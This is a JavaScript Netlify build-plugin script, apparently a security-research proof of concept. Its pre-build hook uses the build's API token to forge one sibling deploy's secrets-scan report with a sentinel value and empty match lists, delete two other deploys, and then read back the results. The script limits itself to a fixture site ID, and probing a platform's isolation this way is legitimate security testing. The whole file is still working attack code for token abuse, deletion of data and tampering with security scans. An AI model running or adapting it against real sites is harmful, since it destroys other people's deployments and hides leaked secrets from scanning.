const TARGETS = {
  deleteSite: '6abde5e4f14320c16651591f',
  deleteBare: '6abde5e4c61ee8022daee5b0',
  validation: '6abde6c7c61ee8077daee59c',
}
const VALIDATION_SENTINEL = 717171

const safeRequest = async ({ apiHost, body, method, path, token }) => {
  const result = { method, pathShape: path.replace(/[0-9a-f]{24}/g, ':deploy_id'), status: null, ok: false }
  try {
    const response = await fetch(new URL(path, apiHost), {
      method,
      headers: {
        Authorization: `Bearer ${token}`,
        ...(body === undefined ? {} : { 'Content-Type': 'application/json' }),
      },
      ...(body === undefined ? {} : { body: JSON.stringify(body) }),
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    result.status = response.status
    result.ok = response.ok
    if (response.status !== 204) {
      const responseBody = await response.json().catch(() => null)
      result.response = responseBody
        ? {
            id: responseBody.id ?? null,
            deploy_id: responseBody.deploy_id ?? null,
            state: responseBody.state ?? null,
            scannedFilesCount:
              responseBody.secrets_scan?.scannedFilesCount ??
              responseBody.secret_scan_result?.scannedFilesCount ??
              null,
          }
        : null
    }
  } catch (error) {
    result.errorClass = error?.constructor?.name ?? 'UnknownError'
  }
  return result
}

export const onPreBuild = async ({ constants }) => {
  const token = constants.NETLIFY_API_TOKEN
  const siteId = constants.SITE_ID
  const currentDeployId = process.env.DEPLOY_ID
  const rawApiHost = constants.NETLIFY_API_HOST || 'https://api.netlify.com'
  const apiHost = /^https?:\/\//i.test(rawApiHost) ? rawApiHost : `https://${rawApiHost}`
  const targetIds = Object.values(TARGETS)
  const result = {
    schema: 'netlify-untrusted-sibling-lifecycle-probe.v2',
    syntheticOnly: true,
    tokenPresent: typeof token === 'string' && token.length > 0,
    siteIdMatchesFixture: siteId === '43a2f4e4-df31-455e-85bc-21f37fae92cd',
    currentDeployIdPresent: typeof currentDeployId === 'string' && currentDeployId.length > 0,
    targetsDistinctFromCurrent: targetIds.every((targetId) => targetId !== currentDeployId),
    targetCount: targetIds.length,
    baseline: {},
    mutations: {},
    readback: {},
  }

  if (!result.tokenPresent || !result.siteIdMatchesFixture || !result.currentDeployIdPresent || !result.targetsDistinctFromCurrent) {
    console.log(`NETLIFY_UNTRUSTED_SIBLING_LIFECYCLE ${JSON.stringify(result)}`)
    return
  }

  for (const [label, deployId] of Object.entries(TARGETS)) {
    result.baseline[label] = await safeRequest({
      apiHost,
      method: 'GET',
      path: `/api/v1/sites/${encodeURIComponent(siteId)}/deploys/${encodeURIComponent(deployId)}`,
      token,
    })
  }

  result.mutations.validation = await safeRequest({
    apiHost,
    body: {
      secrets_scan: {
        scannedFilesCount: VALIDATION_SENTINEL,
        secretsScanMatches: [],
        enhancedSecretsScanMatches: [],
      },
    },
    method: 'PATCH',
    path: `/api/v1/deploys/${encodeURIComponent(TARGETS.validation)}/validations_report`,
    token,
  })
  result.mutations.deleteSite = await safeRequest({
    apiHost,
    method: 'DELETE',
    path: `/api/v1/sites/${encodeURIComponent(siteId)}/deploys/${encodeURIComponent(TARGETS.deleteSite)}`,
    token,
  })
  result.mutations.deleteBare = await safeRequest({
    apiHost,
    method: 'DELETE',
    path: `/api/v1/deploys/${encodeURIComponent(TARGETS.deleteBare)}`,
    token,
  })

  for (const [label, deployId] of Object.entries(TARGETS)) {
    result.readback[label] = await safeRequest({
      apiHost,
      method: 'GET',
      path: `/api/v1/sites/${encodeURIComponent(siteId)}/deploys/${encodeURIComponent(deployId)}`,
      token,
    })
  }

  result.validationSentinel = VALIDATION_SENTINEL
  console.log(`NETLIFY_UNTRUSTED_SIBLING_LIFECYCLE ${JSON.stringify(result)}`)
}
